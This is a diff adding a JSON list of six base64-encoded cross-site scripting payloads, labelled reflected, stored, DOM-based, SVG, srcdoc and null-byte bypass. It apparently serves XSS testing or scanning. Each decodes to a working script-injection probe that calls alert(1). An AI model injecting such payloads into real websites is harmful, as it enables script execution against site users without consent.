@@ -1,0 +1,26 @@
+[
+    {
+        "type": "Reflected",
+        "payload": "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
+    },
+    {
+        "type": "Stored",
+        "payload": "PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=="
+    },
+    {
+        "type": "DOM-Based",
+        "payload": "amF2YXNjcmlwdDphbGVydCgxKQ=="
+    },
+    {
+        "type": "SVG Bypass",
+        "payload": "PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+"
+    },
+    {
+        "type": "Srcdoc",
+        "payload": "PGlmcmFtZSBzcmNkb2M9IjxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD4iPjwvaWZyYW1lPg=="
+    },
+    {
+        "type": "Null Byte",
+        "payload": "PHNjcmlwdCUwMD5hbGVydCgxKTwvc2NyaXB0Pg=="
+    }
+]
